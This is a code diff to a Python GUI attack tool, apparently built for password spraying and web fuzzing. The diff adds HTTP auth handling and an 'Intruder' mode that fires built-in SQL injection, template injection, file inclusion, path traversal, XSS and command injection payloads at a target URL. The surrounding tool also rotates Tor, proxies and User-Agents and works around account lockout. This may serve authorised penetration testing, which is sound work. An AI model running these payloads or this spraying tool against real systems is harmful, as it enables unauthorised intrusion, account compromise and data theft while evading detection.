@@ -38,6 +38,16 @@ try:
 except Exception:
 	httpx = None
 
+try:
+	from requests.auth import HTTPDigestAuth
+except Exception:
+	HTTPDigestAuth = None
+
+try:
+	import requests_ntlm
+except Exception:
+	requests_ntlm = None
+
 
 class RateLimiter:
 	def __init__(self, qps: float) -> None:
@@ -241,6 +251,18 @@ class PasswordListGeneratorApp:
 		self.var_wkhtmltopdf_path = tk.StringVar(value="wkhtmltopdf")
 		self.flow_context_last: dict = {}
 
+		# HTTP Auth
+		self.var_auth_type = tk.StringVar(value="None")  # None, Basic, Digest, NTLM
+		self.var_auth_user = tk.StringVar(value="")
+		self.var_auth_pass = tk.StringVar(value="")
+		self.var_auth_domain = tk.StringVar(value="")
+
+		# Intruder mode (Sniper)
+		self.var_intruder_enabled = tk.BooleanVar(value=False)
+		self.var_intruder_marker = tk.StringVar(value="§PAYLOAD§")
+		self.var_intruder_payloads_file = tk.StringVar(value="")
+		self.var_intruder_builtin = tk.StringVar(value="none")  # none,sqli,ssti,lfi,traversal,xss,cmdi
+
 	def _default_output_path(self) -> str:
 		timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
 		base = f"Passwordlist-{timestamp}.txt"
@@ -295,34 +317,34 @@ class PasswordListGeneratorApp:
 		ttk.Label(target, text="SQLi field").grid(row=4, column=7, sticky="e", padx=4, pady=4)
 		ttk.Combobox(target, textvariable=self.var_sqli_field, values=["username", "password"], width=10, state="readonly").grid(row=4, column=8, sticky="w", padx=4, pady=4)
 		self._add_labeled_entry(target, "Headers JSON", self.var_headers_json, row=5, col=0)
-		self._add_labeled_entry(target, "Cookies (k=v; k2=v2)", self.var_cookies, row=5, col=2)
-		self._add_labeled_entry(target, "Proxy URL", self.var_proxy_url, row=5, col=4)
-		ttk.Checkbutton(target, text="Verify TLS", variable=self.var_verify_tls).grid(row=5, column=6, sticky="w", padx=4, pady=4)
-		self._add_labeled_entry(target, "Timeout (s)", self.var_timeout, row=5, col=7)
+		self._add_labeled_entry(target, "Cookies (k=v; k2=v2)", self.var_cookies, row=6, col=0)
+		self._add_labeled_entry(target, "Proxy URL (http/socks5)", self.var_proxy_url, row=7, col=0)
+		ttk.Checkbutton(target, text="Verify TLS", variable=self.var_verify_tls).grid(row=8, column=0, sticky="w", padx=4, pady=4)
+		self._add_labeled_entry(target, "Timeout (s)", self.var_timeout, row=8, col=2, from_=1, to=120)
 		# Lockout detection controls
-		ttk.Checkbutton(target, text="Enable lockout detection", variable=self.var_lockout_enabled).grid(row=6, column=0, sticky="w", padx=4, pady=4)
-		self._add_labeled_entry(target, "Lockout codes (csv)", self.var_lockout_codes, row=6, col=2)
-		self._add_labeled_entry(target, "Lockout regex", self.var_lockout_regex, row=6, col=4)
-		self._add_labeled_entry(target, "Lockout cooldown (min)", self.var_lockout_cooldown_min, row=6, col=6)
-		ttk.Checkbutton(target, text="Jitter", variable=self.var_lockout_jitter).grid(row=6, column=8, sticky="w", padx=4, pady=4)
+		ttk.Checkbutton(target, text="Enable lockout detection", variable=self.var_lockout_enabled).grid(row=9, column=0, sticky="w", padx=4, pady=4)
+		self._add_labeled_entry(target, "Lockout codes (csv)", self.var_lockout_codes, row=9, col=2)
+		self._add_labeled_entry(target, "Lockout regex", self.var_lockout_regex, row=9, col=4)
+		self._add_labeled_entry(target, "Lockout cooldown (min)", self.var_lockout_cooldown_min, row=9, col=6)
+		ttk.Checkbutton(target, text="Jitter", variable=self.var_lockout_jitter).grid(row=9, column=8, sticky="w", padx=4, pady=4)
 		# Proxy & UA rotation
-		ttk.Checkbutton(target, text="Use Tor (SOCKS5)", variable=self.var_tor_mode).grid(row=7, column=0, sticky="w", padx=4, pady=4)
-		self._add_labeled_entry(target, "Tor proxy", self.var_tor_proxy, row=7, col=2)
-		self._add_labeled_entry(target, "Proxy list file", self.var_proxy_list_file, row=7, col=4)
-		ttk.Button(target, text="Browse…", command=self.on_browse_proxy_list_file).grid(row=7, column=6, sticky="w", padx=4, pady=4)
-		ttk.Label(target, text="Proxy rotation").grid(row=7, column=7, sticky="e", padx=4, pady=4)
-		ttk.Combobox(target, textvariable=self.var_proxy_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=7, column=8, sticky="w", padx=4, pady=4)
-		ttk.Checkbutton(target, text="Rotate User-Agent", variable=self.var_user_agent_rotate).grid(row=8, column=0, sticky="w", padx=4, pady=4)
-		self._add_labeled_entry(target, "UA list file", self.var_user_agent_list_file, row=8, col=2)
-		ttk.Button(target, text="Browse…", command=self.on_browse_user_agent_list_file).grid(row=8, column=4, sticky="w", padx=4, pady=4)
-		ttk.Label(target, text="UA rotation").grid(row=8, column=5, sticky="e", padx=4, pady=4)
-		ttk.Combobox(target, textvariable=self.var_user_agent_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=8, column=6, sticky="w", padx=4, pady=4)
+		ttk.Checkbutton(target, text="Use Tor (SOCKS5)", variable=self.var_tor_mode).grid(row=10, column=0, sticky="w", padx=4, pady=4)
+		self._add_labeled_entry(target, "Tor proxy", self.var_tor_proxy, row=10, col=2)
+		self._add_labeled_entry(target, "Proxy list file", self.var_proxy_list_file, row=10, col=4)
+		ttk.Button(target, text="Browse…", command=self.on_browse_proxy_list_file).grid(row=10, column=6, sticky="w", padx=4, pady=4)
+		ttk.Label(target, text="Proxy rotation").grid(row=10, column=7, sticky="e", padx=4, pady=4)
+		ttk.Combobox(target, textvariable=self.var_proxy_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=10, column=8, sticky="w", padx=4, pady=4)
+		ttk.Checkbutton(target, text="Rotate User-Agent", variable=self.var_user_agent_rotate).grid(row=11, column=0, sticky="w", padx=4, pady=4)
+		self._add_labeled_entry(target, "UA list file", self.var_user_agent_list_file, row=11, col=2)
+		ttk.Button(target, text="Browse…", command=self.on_browse_user_agent_list_file).grid(row=11, column=4, sticky="w", padx=4, pady=4)
+		ttk.Label(target, text="UA rotation").grid(row=11, column=5, sticky="e", padx=4, pady=4)
+		ttk.Combobox(target, textvariable=self.var_user_agent_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=11, column=6, sticky="w", padx=4, pady=4)
 		# Engine & pool config
-		ttk.Checkbutton(target, text="Async engine (httpx)", variable=self.var_async_engine).grid(row=9, column=0, sticky="w", padx=4, pady=4)
-		ttk.Checkbutton(target, text="HTTP/2", variable=self.var_http2).grid(row=9, column=1, sticky="w", padx=4, pady=4)
-		self._add_labeled_spinbox(target, "Max conns", self.var_max_connections, row=9, col=2, from_=1, to=1000)
-		self._add_labeled_spinbox(target, "Retries", self.var_retries, row=9, col=4, from_=0, to=10)
-		self._add_labeled_spinbox(target, "Backoff (ms)", self.var_backoff_ms, row=9, col=6, from_=0, to=5000)
+		ttk.Checkbutton(target, text="Async engine (httpx)", variable=self.var_async_engine).grid(row=12, column=0, sticky="w", padx=4, pady=4)
+		ttk.Checkbutton(target, text="HTTP/2", variable=self.var_http2).grid(row=12, column=1, sticky="w", padx=4, pady=4)
+		self._add_labeled_spinbox(target, "Max conns", self.var_max_connections, row=12, col=2, from_=1, to=1000)
+		self._add_labeled_spinbox(target, "Retries", self.var_retries, row=12, col=4, from_=0, to=10)
+		self._add_labeled_spinbox(target, "Backoff (ms)", self.var_backoff_ms, row=12, col=6, from_=0, to=5000)
 		for i in range(0, 9):
 			target.grid_columnconfigure(i, weight=1)
 
@@ -522,6 +544,26 @@ class PasswordListGeneratorApp:
 		notes.pack(fill=tk.BOTH, expand=True, **padding)
 		self.notes_text = scrolledtext.ScrolledText(notes, height=6)
 		self.notes_text.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
+
+		# HTTP Auth
+		authf = ttk.LabelFrame(main, text="HTTP Authentication")
+		authf.pack(fill=tk.X, **padding)
+		self._add_labeled_combobox(authf, "Auth type", self.var_auth_type, ["None","Basic","Digest","NTLM"], row=0, col=0)
+		self._add_labeled_entry(authf, "Auth username", self.var_auth_user, row=0, col=2)
+		self._add_labeled_entry(authf, "Auth password", self.var_auth_pass, row=0, col=4)
+		self._add_labeled_entry(authf, "Auth domain (NTLM)", self.var_auth_domain, row=0, col=6)
+		for i in range(0, 8):
+			authf.grid_columnconfigure(i, weight=1)
+
+		# Intruder
+		intr = ttk.LabelFrame(main, text="Intruder (Sniper)")
+		intr.pack(fill=tk.X, **padding)
+		self._add_labeled_check(intr, "Enable Intruder", self.var_intruder_enabled, row=0, col=0)
+		self._add_labeled_entry(intr, "Marker", self.var_intruder_marker, row=0, col=2)
+		self._add_labeled_entry(intr, "Payloads file", self.var_intruder_payloads_file, row=0, col=4)
+		self._add_labeled_combobox(intr, "Builtin set", self.var_intruder_builtin, ["none","sqli","ssti","lfi","traversal","xss","cmdi"], row=0, col=6)
+		for i in range(0, 8):
+			intr.grid_columnconfigure(i, weight=1)
 
 	def _add_labeled_entry(self, master, label, var, row, col) -> None:
 		ttk.Label(master, text=label).grid(row=row, column=col, sticky="e", padx=4, pady=4)
@@ -809,39 +851,15 @@ class PasswordListGeneratorApp:
 				qps = min(qps, float(self.var_safe_qps_cap.get() or 1.0))
 				concurrency = min(concurrency, int(self.var_safe_concurrency_cap.get() or 2))
 				self.var_lockout_jitter.set(True)
+			# Flow guard for async engine
+			if bool(self.var_async_engine.get()) and self.var_flow_enabled.get():
+				messagebox.showwarning("Flow & Async", "Flow Builder currently runs only with the synchronous engine. Disable Async engine to use flows.")
 			# Usernames collection
 			usernames = self._collect_usernames(username)
 			if not usernames:
 				messagebox.showerror("Usernames", "Provide a username value or a usernames file, or enable pattern generation.")
 				return
-			# Spray configuration
-			spray_enabled = bool(self.var_spray_enabled.get())
-			passwords = []
-			cooldown_min = float(self.var_spray_cooldown_min.get() or 15.0)
-			window_min = float(self.var_spray_window_min.get() or 60.0)
-			attempts_per_window = max(1, int(self.var_spray_attempts_per_window.get() or 1))
-			min_cooldown = max(0.1, window_min / attempts_per_window)
-			if spray_enabled:
-				if not self.var_spray_passwords_file.get().strip():
-					messagebox.showerror("Spray passwords", "Please choose a passwords file for spraying (one per line).")
-					return
-				passwords = self._parse_list_file(self.var_spray_passwords_file.get().strip())
-				if not passwords:
-					messagebox.showerror("Spray passwords", "No passwords found in file.")
-					return
-				if cooldown_min < min_cooldown:
-					cooldown_min = min_cooldown
-					self.ui_queue.put(("log", f"Cooldown increased to {cooldown_min} min to respect window policy ({attempts_per_window} attempts per {window_min} min)."))
-			# Proxy & UA rotation config
-			proxies_list = []
-			if self.var_proxy_list_file.get().strip():
-				proxies_list = self._parse_list_file(self.var_proxy_list_file.get().strip())
-			ua_list = []
-			if self.var_user_agent_rotate.get():
-				if self.var_user_agent_list_file.get().strip():
-					ua_list = self._parse_list_file(self.var_user_agent_list_file.get().strip())
-				if not ua_list:
-					ua_list = self._built_in_user_agents()
+			# Build configuration
 			pentest_args = {
 				"enabled": True,
 				"url": url,
@@ -862,23 +880,15 @@ class PasswordListGeneratorApp:
 				"verify": verify_tls,
 				"timeout": timeout,
 				"concurrency": concurrency,
-				"usernames": usernames,
-				"spray_enabled": spray_enabled,
-				"spray_passwords": passwords,
-				"spray_cooldown_sec": float(cooldown_min) * 60.0,
-				"spray_stop_on_success": bool(self.var_spray_stop_on_success.get()),
-				"email_domain": self.var_email_domain.get().strip(),
-				"lockout_enabled": bool(self.var_lockout_enabled.get()),
-				"lockout_codes": self._parse_codes(self.var_lockout_codes.get()),
-				"lockout_regex": self._compile_regex(self.var_lockout_regex.get()),
-				"lockout_cooldown_sec": float(self.var_lockout_cooldown_min.get() or 30.0) * 60.0,
-				"lockout_jitter": bool(self.var_lockout_jitter.get()),
+				# http auth
+				"auth_type": self.var_auth_type.get(),
+				"auth_user": self.var_auth_user.get(),
+				"auth_pass": self.var_auth_pass.get(),
+				"auth_domain": self.var_auth_domain.get(),
 				# rotation
-				"tor_mode": bool(self.var_tor_mode.get()),
-				"tor_proxy": self.var_tor_proxy.get().strip(),
-				"proxies_list": proxies_list,
+				"proxy_list": self._load_proxy_list_file(self.var_proxy_list_file.get()),
 				"proxy_rotation": self.var_proxy_rotation.get(),
-				"user_agents": ua_list,
+				"user_agents": self._load_user_agents(self.var_user_agent_list_file.get()),
 				"ua_rotation": self.var_user_agent_rotation.get() if self.var_user_agent_rotate.get() else "none",
 				# async engine
 				"async_engine": bool(self.var_async_engine.get()),
@@ -915,6 +925,11 @@ class PasswordListGeneratorApp:
 				"flow_steps": list(self.flow_steps),
 				# notes
 				"notes": self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else "",
+				# intruder
+				"intruder_enabled": bool(self.var_intruder_enabled.get()),
+				"intruder_marker": self.var_intruder_marker.get(),
+				"intruder_payloads_file": self.var_intruder_payloads_file.get(),
+				"intruder_builtin": self.var_intruder_builtin.get(),
 			}
 
 		mode = self.var_mode.get()
@@ -1095,6 +1110,16 @@ class PasswordListGeneratorApp:
 			"flow_steps": list(self.flow_steps),
 			# notes
 			"notes": self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else "",
+			# http auth
+			"auth_type": self.var_auth_type.get(),
+			"auth_user": self.var_auth_user.get(),
+			"auth_pass": self.var_auth_pass.get(),
+			"auth_domain": self.var_auth_domain.get(),
+			# intruder
+			"intruder_enabled": bool(self.var_intruder_enabled.get()),
+			"intruder_marker": self.var_intruder_marker.get(),
+			"intruder_payloads_file": self.var_intruder_payloads_file.get(),
+			"intruder_builtin": self.var_intruder_builtin.get(),
 		}
 		path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("Profile JSON", "*.json"), ("All files", "*.*")])
 		if not path:
@@ -1228,6 +1253,16 @@ class PasswordListGeneratorApp:
 		if hasattr(self, 'notes_text'):
 			self.notes_text.delete('1.0', tk.END)
 			self.notes_text.insert('1.0', profile.get('notes', ''))
+		# http auth
+		self.var_auth_type.set(profile.get('auth_type','None'))
+		self.var_auth_user.set(profile.get('auth_user',''))
+		self.var_auth_pass.set(profile.get('auth_pass',''))
+		self.var_auth_domain.set(profile.get('auth_domain',''))
+		# intruder
+		self.var_intruder_enabled.set(bool(profile.get('intruder_enabled', False)))
+		self.var_intruder_marker.set(profile.get('intruder_marker','§PAYLOAD§'))
+		self.var_intruder_payloads_file.set(profile.get('intruder_payloads_file',''))
+		self.var_intruder_builtin.set(profile.get('intruder_builtin','none'))
 
 		self._info("Profile loaded")
 
@@ -1658,12 +1693,50 @@ class PasswordListGeneratorApp:
 				data = templ
 		try:
 			if method == 'GET':
-				resp = sess.get(url, params=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies)
+				# optional pre-flow
+				if cfg.get('flow_enabled') and cfg.get('flow_per_attempt') and self.flow_steps:
+					try:
+						self._run_flow_sync(sess, cfg, username, password)
+					except Exception as _flow_exc:
+						self.ui_queue.put(("log", f"Flow error (ignored): {_flow_exc}"))
+				# template any string values in params
+				if isinstance(data, dict) and self.flow_context_last:
+					for k in list(data.keys()):
+						val = data[k]
+						if isinstance(val, str):
+							for ck, cv in self.flow_context_last.items():
+								val = val.replace(f"{{{{{ck}}}}}", str(cv))
+							data[k] = val
+				resp = sess.get(url, params=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies, auth=self._build_http_auth(cfg))
 			else:
+				if cfg.get('flow_enabled') and cfg.get('flow_per_attempt') and self.flow_steps:
+					try:
+						self._run_flow_sync(sess, cfg, username, password)
+					except Exception as _flow_exc:
+						self.ui_queue.put(("log", f"Flow error (ignored): {_flow_exc}"))
+				# Apply templating to raw/json payloads
+				if isinstance(data, str) and self.flow_context_last:
+					for ck, cv in self.flow_context_last.items():
+						data = data.replace(f"{{{{{ck}}}}}", str(cv))
+				if json_payload is not None and self.flow_context_last:
+					try:
+						def _walk(obj):
+							if isinstance(obj, dict):
+								return {k: _walk(v) for k, v in obj.items()}
+							if isinstance(obj, list):
+								return [_walk(x) for x in obj]
+							if isinstance(obj, str):
+								for ck, cv in self.flow_context_last.items():
+									obj = obj.replace(f"{{{{{ck}}}}}", str(cv))
+								return obj
+							return obj
+						json_payload = _walk(json_payload)
+					except Exception:
+						pass
 				if json_payload is not None:
-					resp = sess.post(url, json=json_payload, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies)
+					resp = sess.post(url, json=json_payload, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies, auth=self._build_http_auth(cfg))
 				else:
-					resp = sess.post(url, data=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies)
+					resp = sess.post(url, data=data, timeout=cfg['timeout'], headers=call_headers, proxies=call_proxies, auth=self._build_http_auth(cfg))
 			return resp
 		except Exception as exc:
 			self.ui_queue.put(("log", f"Request error: {exc}"))
@@ -2946,6 +3019,84 @@ class PasswordListGeneratorApp:
 			self.flow_context_last = dict(context)
 		except Exception:
 			self.flow_context_last = {}
+
+	def _build_http_auth(self, cfg: dict):
+		atype = (cfg.get('auth_type') or 'None').strip()
+		user = cfg.get('auth_user') or ''
+		pwd = cfg.get('auth_pass') or ''
+		domain = cfg.get('auth_domain') or ''
+		if atype == 'Basic':
+			return (user, pwd)
+		if atype == 'Digest' and HTTPDigestAuth is not None:
+			return HTTPDigestAuth(user, pwd)
+		if atype == 'NTLM' and requests_ntlm is not None:
+			principal = f"{domain}\\{user}" if domain else user
+			return requests_ntlm.HttpNtlmAuth(principal, pwd)
+		return None
+
+	def _intruder_builtin_payloads(self, kind: str) -> list[str]:
+		k = (kind or 'none').lower()
+		if k == 'sqli':
+			return ["' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1","') OR ('1'='1","admin' --","' UNION SELECT NULL--"]
+		if k == 'ssti':
+			return ["{{7*7}}","${7*7}","#{7*7}","<%= 7*7 %>"]
+		if k == 'lfi':
+			return ["../../../../etc/passwd","..\\..\\..\\..\\windows\\win.ini","/etc/passwd","..%2f..%2f..%2fetc%2fpasswd"]
+		if k == 'traversal':
+			return ["..%2f","..\\","..//","..\\..\\"]
+		if k == 'xss':
+			return ["<script>alert(1)</script>","\"/><svg onload=alert(1)>","'><img src=x onerror=alert(1)>"]
+		if k == 'cmdi':
+			return [";id","|id","& whoami","$(id)"]
+		return []
+
+	def _worker_intruder(self, cfg: dict) -> None:
+		try:
+			marker = cfg.get('intruder_marker') or '§PAYLOAD§'
+			payloads = []
+			if cfg.get('intruder_payloads_file'):
+				payloads = self._parse_list_file(cfg.get('intruder_payloads_file'))
+			if not payloads:
+				payloads = self._intruder_builtin_payloads(cfg.get('intruder_builtin'))
+			if not payloads:
+				self.ui_queue.put(("log", "[Intruder] No payloads provided"))
+				self._on_done()
+				return
+			sess = requests.Session()
+			sess.verify = cfg.get('verify_tls', True)
+			if cfg.get('headers'):
+				sess.headers.update(cfg['headers'])
+			if cfg.get('cookies'):
+				sess.cookies.update(cfg['cookies'])
+			if cfg.get('proxies'):
+				sess.proxies.update(cfg['proxies'])
+			rate = RateLimiter(float(cfg.get('qps', 1.0)))
+			stop_event = threading.Event()
+			lock = threading.Lock()
+			idx = 0
+			for payload in payloads:
+				if self.cancel_requested:
+					break
+				idx += 1
+				try:
+					rate.acquire()
+					t0 = time.time()
+					# Build per-call headers/proxies may rotate later; keep as-is
+					cfg['intruder_payload_current'] = payload
+					resp = self._http_attempt(sess, cfg, username="", password="", call_headers=None, call_proxies=None, call_params_extra=None)
+					lat = int((time.time() - t0) * 1000)
+					ok = self._is_success(resp, cfg)
+					self._record_attempt(ok, resp.status_code if resp else 0, lat)
+					self._maybe_capture_artifact(cfg, resp, username=f"INTRUDER:{payload}", password="", extra_notes="intruder")
+					if ok:
+						self.ui_queue.put(("log", f"[Intruder] Potential hit with payload: {payload}"))
+				except Exception as exc:
+					self.ui_queue.put(("log", f"[Intruder] Error on payload {payload}: {exc}"))
+					self._record_attempt(False, 0, 0, error=True)
+			self._on_done()
+		except Exception as exc:
+			self.ui_queue.put(("log", f"[Intruder] Fatal error: {exc}"))
+			self._on_done()
 
 
 if __name__ == "__main__":
